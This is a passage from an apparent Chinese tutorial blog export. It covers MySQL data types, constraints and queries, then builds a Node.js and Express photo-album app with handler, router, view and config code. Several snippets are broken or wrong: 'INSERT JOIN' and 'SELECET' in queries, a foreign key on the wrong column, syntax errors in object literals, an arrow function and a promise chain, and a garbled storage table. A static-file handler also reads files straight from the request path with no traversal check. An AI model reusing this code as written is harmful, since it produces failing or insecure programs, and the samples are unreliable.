‘-838:59:59’/‘838:59:59’ H:MM:SS 时间值或持续时间 YEAR 1 1901/2155 YYY 年份值 DATETIME 8 1000-01-01 00:00:00/9999-12-31 23:59:59 YYY-MM-DD HH:MM:SS 混合日期和时间值 TIMESTAMP 8 1970-01-01 00:00:00/2037 年某时 YYYMMDD HHMMSS 混合日期和时间值，时间戳 如果插入的数值不合法，系统会自动将对应的零值插入到数据库中。 YEAR使用4位字符串或数字表示，范围为‘1901‘ ~ ‘2155’或1901~2155 例如，输入‘2016‘或者2016，插入到数据库的值均为2016 DATE DATE类型用来表示日期值，不包含时间部分。 可以使用“YYYY-MM-DD“或‘YYYYMMDD‘字符串表示 例如，输入‘2016-10-01‘或’20161001‘插入到数据库的日期都是2016-10-01 TIME TIME类型用于表示时间值，它的显示形式一般为HH:MM:SS,其中HH 表示小时，MM表示分，SS表示秒 可以使用下面三种方式指定时间的值： 以“D HH：MM：SS“字符串格式表示。其中，D表示日，可以取0-34之间的值，插入数据时，小时的值等于（D*24+HH） 例如，输入‘2 11:30:50‘，插入数据库的日期为 59:30:50 以‘HHMMSS‘字符串格式或者HHMMSS数字格式表示 例如：输入‘345454‘或345454，插入数据库的日期为34:54:54 使用CURRENT_TIME或NOW()输入当前系统时间 DATETIME 指定DATETIME类型的值： 以‘YYYY-MM-DD HH:MM:SS‘或者’YYYYMMDDHHMMSS‘字符串或数字都可以。 使用NOW来输入当前系统的日期和时间 TIMESTAMP TIMESTAMP类型显示形式和DATETIME相同，但取值范围比DATETIME小。 输入CURRENT_TIMESTAMP输入系统当前日期和时间 输入NULL时，系统会自动输入当前日期和时间 无任何输入时，系统会输入系统当前日期和时间 标记。利用它可以保存表中某条记录的最后修改时间。自动维护。 CHAR和VARCHAR 插入值 CHAR(4) 存储需求 VARCHAR(4) 存储需求 ‘’ ‘’ 4个字节 ‘’ 1个字节 ‘ab’ ‘ab’ 4个字节 ‘ab’ 3个字节 ‘abc’ 4个字节 ‘abc’ 4个字节 ‘abcd’ 4个字节 ‘abcd’ 5个字节 ‘abcde’ ‘abcd’ 4个字节 ‘abcd’ 5个字节 当数据为CHAR(4)类型时，不管插入值的长度是多少，所占用的存储空间都是4个字节。而VARCHAR（4）所对应的数据所占用的字节数为实际长度加1. 总结： 字符长度不固定的类型使用VARCHAR 查询的时候要计算字节的长度 字符串长度固定的使用CHAR 查询速度快。 VARCAHR比CHAR省空间 CHAR比VARCHAR省时间 TEXT类型 表示大文本数据，例如：文章内容、评论等 基本操作查看表结构查看当前数据库中的所有表： show tables; 查看表结构: desc table_name; 查看建表语句: show create table table_name; 修改数据表增加列: ALTER TABLE table_name ADD colum datatype; 修改列: ALTER TABLE table_name MODIFY colum datatype; 删除列: ALTER TABLE table_name DROP colum; 修改表名: rename TABLE table_name to new_table_name; 修改列名: ALTER TABLE table_name change colum_name new_colum_name datatype; 删除数据表DROP TABLE table_name; 表的约束 约束条件 说明 PRIMARY KEY 主键约束，用于唯一标识对应的记录 FOREIGN KEY 外键约束 NOT NULL 非空约束 UNIQUE 唯一性约束 DEFAULT 默认值约束，用于设置字段的默认值 表的约束条件都是针对表中字段进行限制，从而保证数据表中数据的正确性和唯一性。 主键约束每个数据表中最多只能有一个主键约束，定义为PRIMARY KEY 的字段不能有重复值且不能为NULL值。也就是非空而且唯一 语法：字段名 数据类型 PRIMARY KEY 非空约束非空约束指的是字段的值不能为NULL，在MySQL中，非空约束是通过NOT NULL 定义的。 语法：字段名 数据类型 NOT NULL; 唯一约束唯一约束用于保证数据表中字段的唯一性，即表中字段的值不能重复出现。 语法：字段名 数据类型 UNIQUE; 默认约束默认约束用于给数据库中的字段指定默认值，即当在表中插入一条记录时，如果没有给这个字段赋值，数据库系统会为这个字段插入默认值。 语法：字段名 数据类型 DEFAULT 默认值; 设置表的字段值自动增加如果想为表中插入的新纪录自动生成唯一ID。可以使用AUTO_INCREMENT实现 语法：字段名 数据类型 AUTO_INCREMENT; 添加、更新与删除数据添加数据为表中所有字段添加数据12INSERT INTO 表名VALUES(列1值,列2值,...) 注意： values中的值必须与表中的字段一一对应。 插入的数据应与字段中的数据类型相同 数据的大小应该在列的规定范围内，例如不能将一个长度为80的字符串插入到长度为40个列中 字符和日期型数据应该包含在单引号中 如果要插入一个空值，不指定或者使用NULL 按照指定列添加数据：12INSERT INTO 表名(列1名, 列2名,...)VALUES(列1值, 列2值,...) 注意: values中的值必须与列声明中的列一一对应 同时添加多条记录12345INSERT INTO employeeVALUES (value1,value2,value3...), (value1,value2,value3...), (value1,value2,value3), ...; 更新全部数据：12UPDATE 表名SET 列名=值, 列名=值[,列名=值] 按条件更新：123UPDATE 表名SET 列名=值, 列名=值[,列名=值]WHERE 条件; 总结： UPDATE语句可以用新值更新原有表中行的列。 SET字句指定要修改哪些列和要给与哪些值 WHERE需要给定一个条件，表示要更新符号该条件的行，没有WHERE字句，则更新所有行 条件可以使用的运算符：12345678-- 比较运算符 &gt; &lt; &lt;= &gt;= = &lt;&gt; 大于、小于、大于(小于等于)、不等于BETWEEN…AND -- 显示在某一区间的值IN(set) -- 显示在in列表中的值，例：in(100,200)LIKE -- ‘张pattern’ 模糊查询%IS NULL -- 判断是否为空-- 逻辑运算符 AND 多个条件同时成立OR 多个条件任一成立NOT 不成立，例：WHERE NOT(salary&gt;100) 删除数据：删除全部数据1DELETE FROM 表名; 根据条件删除：12DELETE FROM 表名WHERE 条件; 初始化runcate初始化数据表 1truncate table_name; truncate和delete的区别： delete会一条一条的删 truncate先摧毁整张表，再创建一张和原来的表结构一模一样的表 拿拆迁举例子 truncate在效率上比delete高 truncate只能删除整表的数据，也就是格式化。 truncate会把自增id截断恢复为1 总结： 如果不使用WHERE语句，将删除表中所有数据 DELETE不能删除某一列的值，（可使用UPDATE） 使用DELETE语句仅仅删除记录，不删除表本身，如果要删除表，使用DROP TABLE语句 删除表中所有数据也可以使用truncate table_name语句 单表查询简单查询1SELECT [DISTINCT] *|&#123;colum1, colum2, colum3...&#125; FROM table_name; SELECT指定查询哪些列的数据 column指定列名 *号表示查询所有列 FROM 指定查询哪种表 DISTINCT 可选，指查询结果时，是否去除重复数据 查询表中所有数据：1SELECT * FROM 表名; 按照指定列查询表中所有数据：1SELECT 列名,列名[,列名] FROM 表名; 根据条件查询数据：12SELECT * FROM 表名WHERE 条件; 在WHERE字句中经常使用的运算符 比较运算符 &gt; &lt; &lt;= &gt;= = &lt;&gt; 大于、小于、大于(小于等于)、不等于 比较运算符 BETWEEN…AND 显示在某一区间的值 比较运算符 IN(set) 显示在in列表中的值，例：in(100,200) 比较运算符 LIKE ‘张pattern’ 模糊查询% 比较运算符 IS NULL 判断是否为空 逻辑运算符 AND 多个条件同时成立 逻辑运算符 OR 多个条件任一成立 逻辑运算符 NOT 不成立，例：WHERE NOT(salary&gt;100) LIKE语句中，% 代表零个或多个任意字符，_代表一个字符，例如：name LIKE &#39;_a%&#39;; 多表查询：1234567-- 多表查询-- 找到表 articles 中 user_id 等于 users 表中 id 的-- 多表查询可以起别名SELECT a.id as article_id, a.title, a.timeFROM articles as aINSERT JOIN users as uON a.user_id=u.id 查询总记录数：12-- 查询表中的总记录数据SELECT COUNT(id) as count FROM articles; 聚合函数 在实际开发中，经常需要对某些数据进行统计，例如统计某个字段的最大值，最小值，平均值等，为此，MySQL提供了一些函数来实现这些功能。 函数名称 作用 COUNT() 返回某行的列数 SUM() 返回某列值的和 AVG() 返回某列的平均值 MAX() 返回某列值的最大值 MIN() 返回某列的最小值 COUNT（列名）返回某一列，行的总数 COUNT（列名）返回某一列，行的总数 SUM()函数返回满足WHERE条件的行的和 12SELECT SUM(列名) &#123;, SUM(列名)...&#125; FROM table_name [WHERE where_definition] 注意：SUM仅对数值起作用，否则报错; 对多列求和，“,”不能少。 MAX()/MIN()函数返回满足WHERE条件的一列的最大/最小值 12SELECT MAX(列名) FROM table_name [WHERE where_definition]; 对查询结果排序123SELECT colum1, colum2, colum3.. FROM table_name ORDER BY colum ASC|DESC; ORDER BY 指定排序的列，排序的列表即可以是表中的列名，也可以是SELECT语句后指定的列名. ASC 升序，DESC 降序 ORDER BY 字句应该位于SELECT 语句的结尾 分组查询123SELECT colum1, colum2, ... FROM 表名 LIMIT [OFFSET, ] 记录数 LIMIT表示从哪一条记录开始往后【不包含该记录】，以及一共查询多少记录 OFFSET表示偏移量: 如果为0则表示从第一条记录开始 如果为5则表示从第6条记录开始 使用场景：分页查询 分页查询一个例子 1234-- 仅仅取了前 10 条SELECET * FROM articles LIMIT 10-- 跳过一条取一条SELECET * FROM articles LIMIT 1, 1 为表和字段区别名为表取别名12SELECT 表别名.id,表别名.name... FROM 表名 AS 表别名 WHERE 表别名.id = 2.. 为字段取别名1SELECT 字段名 [AS] 别名 [,字段名 [AS] 别名,...] FROM 表名; 多表操作实际开发中业务逻辑比较复杂，可能有几十到几百张表不等，所以我们就需要对多张表来进行查询操作，对两张以上的表进行操作，就是多表操作。 外键为了保证数据的完整性，将两张表之间的数据建立关系，因此就需要在成绩表中添加外键约束。 外键是指引用另一个表中的一列或多列，被引用的列应该具有主键约束或唯一约束。 外键用于建立和加强两个表数据之间的链接。 为表添加外键约束创建表的时候添加外键: 12345678910CREATE TABLE department( id INT PRIMARY KEY auto_increment, name VARCHAR(20) NOT NULL);CREATE TABLE employee( id INT PRIMARY KEY auto_increment, name VARCHAR(20) NOT NULL, dept_id INT, FOREIGN KEY (id) REFERENCES department(id)); 表已经存在，通过修改表的语句增加外键: 1ALTER TABLE 表名 ADD CONSTRAINT 外键名 FOREIGN KEY(外键字段名) REFERENCES 外表表名(主键字段名); 删除外键约束1ALTER TABLE 表名 DROP FOREIGN KEY 外键名; 操作关联表 关联关系: 多对一 多对多 一对一 使用 Node 操作 MySQL 数据库安装： 1$ npm install --save mysql 使用 Node 操作 1234567891011121314151617181920212223242526272829var mysql = require('mysql');// 连接数据库var connection = mysql.createConnection(&#123; host: 'localhost', port: 3306, user: 'root', password: '*********', database: 'personal'&#125;);// 开始操作之前先连接，这一步可以省略// 当操作数据库的时候，可以自动连接// connection.connect();// 操作数据库// 第一个参数就是任何 SQL 语言，增删改查，? 是要拼接字符串的数据// 第二个参数可选，传入数据数组// 第三个参数：回调函数// 回调函数中的第一个参数就是异常错误对象// 回调函数中的第二个参数就是操作结果// 第三个参数可以省略，基本不考虑connection.query('SELECT * FROM `users` WHERE `age`&gt;?', [20], function(err, rows, fields) &#123; if (err) throw err; // 如果是 SELECT，结果是数组 console.log('The solution is: ', rows[0].solution); // 对象中有一个数组很重要：affectedRows console.log(`受影响的行数：$&#123;rows.affectedRows&#125;`);&#125;);// 关闭数据库// 一般就是一个连接操作一次数据库，操作完毕，断开连接connection.end(); 使用 Node 操作： 12345678910111213141516171819const mysql = require('mysql')exports.query = (sql, params = [], callback) =&gt; &#123; const connection = mysql.createConnection(&#123; connectionLimit : 500, host: 'localhost', port: 3306, user: 'root', password: '*********', database: 'personal' &#125;) connection.query(sql, params, (err, rows) =&gt; &#123; if (err) &#123; return callback(err) &#125; callback(null, rows) // 操作完毕，结束连接 connection.end() &#125;)&#125; 使用连接池操作 MySQL 数据库 修改安装目录下 my.ini 文件中的: max_connections=1000 默认是 max_connections=151 重启服务器 连接池封装过程： 1234567891011121314151617181920212223242526272829303132const mysql = require('mysql');// 使用连接，提高操作数据库效率// 创建一个连接池，池子存放的连接数量是 100 个const pool = mysql.createPool(&#123; connectionLimit: 100, host: 'localhost', user: 'root', password: '*********', database: 'personal'&#125;);for (let i = 0; i &lt; 1000; i++) &#123; // 从池子中拿一个可用的连接 pool.getConnection((err, connection) =&gt; &#123; if (err) &#123; throw err; &#125; connection.query('INSERT INTO `feedback`(`message`, `name`, `email`, `date`) VALUES(?, ?, ?, ?)', [ '今天的雾霾很醇厚', '校长', 'xiaozhang@abc.com', '2016-11-17 09:31:00' ], (err, stat) =&gt; &#123; // 尽早的释放回连接池 // 只要操作数据库的回调函数被执行，说明这个连接的任务完成了 connection.release(); if (err) &#123; throw err; &#125; console.log(`第$&#123;i+1&#125;个任务完成了`); &#125;); &#125;);&#125; 封装：db.js 12345678910111213141516171819202122232425262728293031323334353637const mysql = require('mysql');const pool = mysql.createPool(&#123; connectionLimit: 100, host: 'localhost', user: 'root', password: '*********', database: 'personal'&#125;);// rest 参数// 作为函数参数的最后一个参数出现，以 ... 开头，后面跟一个名字// rest 参数就代替了 argumentsexports.query = function (sql, ...values) &#123; let callback; let params = []; if (values.length === 3) &#123; params = values[0]; callback = values[1]; &#125; else if (values.length === 2) &#123; callback = values[0]; &#125; pool.getConnection((err, connection) =&gt; &#123; if (err) &#123; return callback(err); &#125; // 如果传递了两个参数，则第二个参数就是 callback // 也就是说这种情况下，params 就是 callback // 后面的 参数就忽略不计了 // 如果真的传递了三个参数，那就是一一对应 connection.query(sql, params, (err, result) =&gt; &#123; connection.release(); if (err) &#123; return callback(err); &#125; callback(null, result); &#125;); &#125;);&#125;; promise 版123456789101112131415161718192021222324const mysql = require('mysql');const pool = mysql.createPool(&#123; connectionLimit: 100, host: 'localhost', user: 'root', password: '*********', database: 'personal'&#125;);exports.query = (sql, params = []) =&gt; &#123; return new Promise((resolve, reject) =&gt; &#123; pool.getConnection((err, connection) =&gt; &#123; if (err) &#123; return reject(err); &#125; connection.query(sql, params, (err, result) =&gt; &#123; connection.release(); if (err) &#123; return reject(err); &#125; resolve(result); &#125;); &#125;); &#125;);&#125;; 调用示例： 123456789101112const db = require('./db')db.query('SELECT 1 + 1 as solution'); .then(rows =&gt; &#123; // use rows return db.query('INSERT INTO table_name VALUES(?, ?, ?)', ['值1', '值2', '值3']) &#125;) .then(rows =&gt; &#123; // use rows &#125;) .catch(err =&gt; &#123; // handle error &#125;);]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
        <tag>MySQL</tag>
        <tag>MongoDB</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Node-相册小项目（下）]]></title>
    <url>%2F2017%2F03%2F10%2FNode-%E7%9B%B8%E5%86%8C%E5%B0%8F%E9%A1%B9%E7%9B%AE%EF%BC%88%E4%B8%8B%EF%BC%89%2F</url>
    <content type="text"><![CDATA[将相册项目（中）继续升级，最终使用 Express 版本。 封装 render 渲染函数 获取模板字符串中需要的数据 获取模板字符串 fs.readFile(&#39;文件名&#39;); 将模板字符串中用到的数据和模板字符串通过模板引擎整合到一起 _.template(模板字符串)({数据对象}); 发送响应 res.end(_.template(模板字符串)({数据对象})); render(‘文件路径’, ‘数据对象’);render(‘index’, ‘数据对象’); 综上所述，封装的具体代码如下： 12345678910111213module.exports = res =&gt; &#123; res.render = (viewName, obj = &#123;&#125;) =&gt; &#123; fs.readFile(`$&#123;path.join(config.viewPath, viewName)&#125;.html`, 'utf8', (err, data) =&gt; &#123; if (err) &#123; throw err; &#125; res.writeHead(200, &#123; 'Content-Type': 'text/html; charset=utf-8' &#125;) res.end(_.template(data)(obj)); &#125;); &#125;;&#125;; handler.js123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114const fs = require('fs');const path = require('path');const _ = require('underscore');const mime = require('mime');const config = require('./config');const qstring = require('querystring');const formidable = require('formidable');exports.showIndex = (req, res) =&gt; &#123; fs.readdir(config.uploadDir, (err, files) =&gt; &#123; if (err) &#123; throw err; &#125; // 调用 render() 函数 res.render('index', &#123; albumNames: files &#125;); &#125;);&#125;;exports.showPublic = (req, res) =&gt; &#123; const url = decodeURI(req.url); fs.readFile(`.$&#123;url&#125;`, (err, data) =&gt; &#123; if (err) &#123; res.writeHead(404, 'Not Found'); res.end(); &#125; res.writeHead(200, &#123; 'Content-Type': mime.lookup(req.url) &#125;); res.end(data); &#125;);&#125;;exports.doAddAlbum = (req, res) =&gt; &#123; const albumName = req.query.albumName ? req.query.albumName.trim() : ''; if (/(\\|\/|\:|\*|\?|"|\&lt;|\&gt;|\|)|^$/.test(albumName)) &#123; return res.end('albumName param invalid error.'); &#125; fs.access(path.join(config.uploadDir, albumName), err =&gt; &#123; if (!err) &#123; return res.end('albumName already exists'); &#125; fs.mkdir(path.join(config.uploadDir, albumName), err =&gt; &#123; if (err) &#123; throw err; &#125; res.redirect('/'); &#125;); &#125;);&#125;;exports.showAlbum = (req, res) =&gt; &#123; const albumName = req.query.albumName ? req.query.albumName.trim() : ''; fs.access(path.join(config.uploadDir, albumName), err =&gt; &#123; if (err) &#123; return res.end('album not exists.'); &#125; fs.readdir(path.join(config.uploadDir, albumName), (err, files) =&gt; &#123; if (err) &#123; throw err; &#125; res.render('album', &#123; albumName: albumName, albumPaths: files.map(fileName =&gt; `/uploads/$&#123;albumName&#125;/$&#123;fileName&#125;`) &#125;); &#125;); &#125;);&#125;;// 测试登录页exports.showLogin = (req, res) =&gt; &#123; res.render('login', &#123; Name: 'Jack' &#125;);&#125;;exports.doUpload = (req, res) =&gt; &#123; const albumName = req.query.albumName ? req.query.albumName : ''; fs.access(path.join(config.uploadDir, albumName), err =&gt; &#123; if (err) &#123; return res.end('album not exists'); &#125; const form = new formidable.IncomingForm(); form.uploadDir = path.join(config.uploadDir, albumName); form.keepExtensions = true; form.maxFieldsSize = 10 * 1024 * 1024; form.parse(req, (err, fields, files) =&gt; &#123; if (err) &#123; return res.end('The default size is 10MB.'); &#125; res.redirect(`/album?albumName=$&#123;albumName&#125;`); &#125;); &#125;);&#125;;exports.showRegister = (req, res) =&gt; &#123; fs.readFile(path.join(config.viewPath, 'register.html'), (err, data) =&gt; &#123; if (err) &#123; throw err; &#125; res.end(data); &#125;);&#125;;exports.doRegister = (req, res) =&gt; &#123; let buffers = []; req.on('data', data =&gt; &#123; buffers.push(data); &#125;); req.on('end', () =&gt; &#123; const file = Buffer.concat(buffers); fs.writeFile('./a', file, err =&gt; &#123; if (err) &#123; throw err; &#125; console.log('writed success'); &#125;); console.log(file.length); // console.log(qstring.parse(body)) &#125;);&#125;; router.js123456789101112131415161718192021222324252627282930313233343536373839const url = require('url');const handler = require('./handler');const render = require('./common/render');// http://www.baidu.com:80/a/b/c?key=value&amp;key=value#xxx// 协议://主机名:端口号:请求路径?查询字符串#内部定位// 单页应用中就是利用 hash 来作为网站的请求标识路由的module.exports = function (req, res) &#123; const urlObj = url.parse(req.url, true); const pathname = urlObj.pathname; const queryObj = urlObj.query; const method = req.method.toLowerCase(); req.query = queryObj || &#123;&#125;; res.redirect = url =&gt; &#123; res.writeHead(302, &#123; 'Location': encodeURI(url); &#125;); res.end(); &#125;; // 只要调用了该方法，res 对象就拥有了一个成员叫做 render // 以后只要是渲染模板，那就直接调用 res.render('视图名称', 数据对象) render(res); if (pathname === '/') &#123; handler.showIndex(req, res); &#125; else if (method === 'get' &amp;&amp; (pathname.startsWith('/public/') || pathname.startsWith('/uploads/') || pathname.startsWith('/node_modules/'))) &#123; handler.showPublic(req, res); &#125; else if (method === 'get' &amp;&amp; pathname === '/album/add') &#123; handler.doAddAlbum(req, res); &#125; else if (method === 'get' &amp;&amp; pathname === '/album') &#123; handler.showAlbum(req, res); &#125; else if (method === 'post' &amp;&amp; pathname === '/upload') &#123; handler.doUpload(req, res); &#125; else if (method === 'get' &amp;&amp; pathname === '/register') &#123; handler.showRegister(req, res); &#125; else if (method === 'post' &amp;&amp; pathname === '/register') &#123; handler.doRegister(req, res); &#125; else if (method === 'get' &amp;&amp; pathname === '/login') &#123; handler.showLogin(req, res); &#125;&#125; ExpressExpress 是一个基于 Node.js 开发的快速、开放、极简的 Web 开发框架，可以用来快速构建网站后台，使用 Express 可以让你更加专注于业务的处理。 Koa Sails ThinkJS 特性 Express框架建立在node.js内置的http模块上 不对 Node.js 已有的特性进行二次抽象 在 HTTP 模块之上扩展了 Web 应用所需的基本功能，例如：req.query、res.send、res.json、res.render 等API 原来的 HTTP 模块的 req.url、req.method，res.write，res.end 等 API 依然存在 轻量、API简单友好 简单语义化的路由系统 强大的中间件处理系统 Geting Started 安装 hello world 路由 处理静态资源 安装： 1$ npm install --save express 基本路由及基本使用： 12345678910111213141516171819202122const express = require('express');// 1. 调用 express 得到一个 app 实例对象// 这里就好比是 http.createServer// 得到的 app 就是 serverconst app = express();// 2. 添加路由，设置处理函数// 当用户以 GET 请求 / 路径的时候，执行相应的回调处理函数app.get('/', (req, res) =&gt; &#123; res.send('Index Page');;&#125;);// 当用户以 GET 请求 /login 路径的时候，执行相应的回调处理函数app.get('/login', (req, res) =&gt; &#123; res.send('Login Page');&#125;);// 处理以 POST 请求 /uploadapp.post('/upload', (req, res) &#123; res.send('Upload');&#125;);// 3. 绑定端口，启动服务器app.listen(3000, () =&gt; &#123; console.log('server is listenning at port 3000.');&#125;); 处理静态资源： 123456// 将 node_modules、public、uploads 目录开放给用户，可以直接通过绝对路径的形式访问该目录中的资源// 第一个参数表示以什么标识开头，第二个参数调用 express.static('路径') 要暴力的目录的路径// 注意第一个参数请求标识，所有请求标识都是以 / 开头的app.use('/node_modules', express.static('./node_modules/'));app.use('/public', express.static('./public/'));app.use('/uploads', express.static('./uploads/')); express 版的 相册views 目录下views 目录下 index.html 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475&lt;!doctype html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;我的相册 - &lt;/title&gt; &lt;meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"&gt; &lt;link rel="stylesheet" href="node_modules/bootstrap/dist/css/bootstrap.css"&gt; &lt;link rel="stylesheet" href="public/css/main.css"&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="container-fluid"&gt; &lt;nav class="navbar navbar-default"&gt; &lt;div class="container-fluid"&gt; &lt;div class="navbar-header"&gt; &lt;button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false"&gt; &lt;span class="sr-only"&gt;Toggle navigation&lt;/span&gt; &lt;span class="icon-bar"&gt;&lt;/span&gt; &lt;span class="icon-bar"&gt;&lt;/span&gt; &lt;span class="icon-bar"&gt;&lt;/span&gt; &lt;/button&gt; &lt;a class="navbar-brand" href="/"&gt;我的相册&lt;/a&gt; &lt;/div&gt; &lt;div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1"&gt; &lt;ul class="nav navbar-nav"&gt; &lt;li class="active"&gt;&lt;a href="/"&gt;首页 &lt;span class="sr-only"&gt;(current)&lt;/span&gt;&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;ul class="nav navbar-nav navbar-right"&gt; &lt;li&gt; &lt;a href="" data-toggle="modal" data-target="#exampleModal" data-whatever="@mdo"&gt;新建相册&lt;/a&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;/nav&gt; &lt;/div&gt; &lt;div class="container"&gt; &lt;div class="row"&gt; &lt;% albumNames.forEach(function(albumName)&#123; %&gt; &lt;div class="col-xs-6 col-md-3"&gt; &lt;a href="/album?albumName=&lt;%= albumName %&gt;" class="thumbnail"&gt; &lt;img src="public/img/icon.png" alt=""&gt; &lt;/a&gt; &lt;div class="caption"&gt; &lt;h3&gt;&lt;%= albumName %&gt;&lt;/h3&gt; &lt;/div&gt; &lt;/div&gt; &lt;% &#125;) %&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel"&gt; &lt;div class="modal-dialog" role="document"&gt; &lt;div class="modal-content"&gt; &lt;form action="/album/add" method="get"&gt; &lt;div class="modal-header"&gt; &lt;button type="button" class="close" data-dismiss="modal" aria-label="Close"&gt;&lt;span aria-hidden="true"&gt;&amp;times;&lt;/span&gt;&lt;/button&gt; &lt;h4 class="modal-title" id="exampleModalLabel"&gt;新建相册&lt;/h4&gt; &lt;/div&gt; &lt;div class="modal-body"&gt; &lt;div class="form-group"&gt; &lt;label for="recipient-name" class="control-label"&gt;相册名称:&lt;/label&gt; &lt;input type="text" class="form-control" name="albumName" placeholder="请输入相册名称"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="modal-footer"&gt; &lt;button type="button" class="btn btn-default" data-dismiss="modal"&gt;关闭&lt;/button&gt; &lt;button type="submit" class="btn btn-success"&gt;点击添加&lt;/button&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;script src="node_modules/jquery/dist/jquery.js"&gt;&lt;/script&gt; &lt;script src="node_modules/bootstrap/dist/js/bootstrap.js"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; views 目录下 album.html 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;!doctype html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;我的相册 -&lt;/title&gt; &lt;link rel="stylesheet" href="node_modules/bootstrap/dist/css/bootstrap.css"&gt; &lt;link rel="stylesheet" href="public/css/main.css"&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="container-fluid"&gt; &lt;nav class="navbar navbar-default"&gt; &lt;div class="container-fluid"&gt; &lt;div class="navbar-header"&gt; &lt;button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false"&gt; &lt;span class="sr-only"&gt;Toggle navigation&lt;/span&gt; &lt;span class="icon-bar"&gt;&lt;/span&gt; &lt;span class="icon-bar"&gt;&lt;/span&gt; &lt;span class="icon-bar"&gt;&lt;/span&gt; &lt;/button&gt; &lt;a class="navbar-brand" href="/"&gt;我的相册&lt;/a&gt; &lt;/div&gt; &lt;div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1"&gt; &lt;ul class="nav navbar-nav"&gt; &lt;li class="active"&gt;&lt;a href="/"&gt;首页 &lt;span class="sr-only"&gt;(current)&lt;/span&gt;&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;ul class="nav navbar-nav navbar-right"&gt; &lt;li&gt;&lt;a href="" data-toggle="modal" data-target="#exampleModal" data-whatever="@mdo"&gt;照片上传&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;/nav&gt; &lt;/div&gt; &lt;div class="container"&gt; &lt;div class="row"&gt; &lt;% albumPaths.forEach(function (imgSrc) &#123; %&gt; &lt;div class="col-xs-6 col-md-3"&gt; &lt;div class="thumbnail"&gt; &lt;img src="&lt;%= imgSrc %&gt;" alt=""&gt; &lt;/div&gt; &lt;/div&gt; &lt;% &#125;) %&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel"&gt; &lt;div class="modal-dialog" role="document"&gt; &lt;div class="modal-content"&gt; &lt;form action="/upload?albumName=&lt;%= albumName %&gt;" method="post" enctype="multipart/form-data"&gt; &lt;div class="modal-header"&gt; &lt;button type="button" class="close" data-dismiss="modal" aria-label="Close"&gt;&lt;span aria-hidden="true"&gt;&amp;times;&lt;/span&gt;&lt;/button&gt; &lt;h4 class="modal-title" id="exampleModalLabel"&gt;照片上传&lt;/h4&gt; &lt;/div&gt; &lt;div class="modal-body"&gt; &lt;div class="form-group"&gt; &lt;label for="recipient-name" class="control-label"&gt;请选择文件:&lt;/label&gt; &lt;input type="file" class="form-control" name="pic"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="modal-footer"&gt; &lt;button type="button" class="btn btn-default" data-dismiss="modal"&gt;关闭&lt;/button&gt; &lt;button type="submit" class="btn btn-success"&gt;点击上传&lt;/button&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;script src="node_modules/jquery/dist/jquery.js"&gt;&lt;/script&gt; &lt;script src="node_modules/bootstrap/dist/js/bootstrap.js"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 根目录config.js 12345const path = require('path');module.exports = &#123; uploadDir: path.join(__dirname, 'uploads'), viewPath : path.join(__dirname, 'views');&#125;; app.js 123456789101112131415161718192021222324252627282930313233343536const express = require('express');const path = require('path');const router = require('./router');const config = require('./config');const fs = require('fs');// 1. 创建 app 实例对象const app = express();// 2. 处理公共请求app .use('/node_modules',express.static(path.join(__dirname, 'node_modules'))) .use('/public',express.static(path.join(__dirname, 'public'))) .use('/uploads',express.static(path.join(__dirname, 'uploads')));// 使用 ejs 模板引擎，配置 html 后缀名// 配置模板文件存放的路径，如果不设置，默认就是去当前目录下找 view 目录app.set('views', config.viewPath);app.engine('.html', require('ejs').__express);app.set('view engine', 'html');// 3. 加载路由app.use(router);// Express 全局处理错误中间件，把该中间件放到最后// 在之前的任何中间件中，如果有错误发生，就调用 next ，将错误对象传递给 next // 只要 next 有错误对象参数，该中间件就会被匹配到并执行app.use((err, req, res, next) =&gt; &#123; fs.appendFile('./log.txt', err.message, err =&gt; &#123; if (err) &#123; console.log('写入日志失败'); &#125; // 有错误发生的时候，记录错误、通知网站管理员（发邮件、发短信） console.log('记录错误日志成功'); res.render('500'); &#125;);&#125;);// 4. 启动监听app.listen(3000, () =&gt; &#123; console.log('Server is running at port 3000.');&#125;); router.js 123456789101112const express = require('express');const handler = require('./handler');// 1. 创建一个路由实例const router = express.Router();// 2. 给路由实例对象挂载路由router .get('/', handler.showIndex) .get('/album/add', handler.doAddAlbum) .get('/album', handler.showAlbum) .post('/upload', handler.doUpload)// 3. 暴露路由实例对象module.exports = router; handler.js 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970const fs = require('fs');const path = 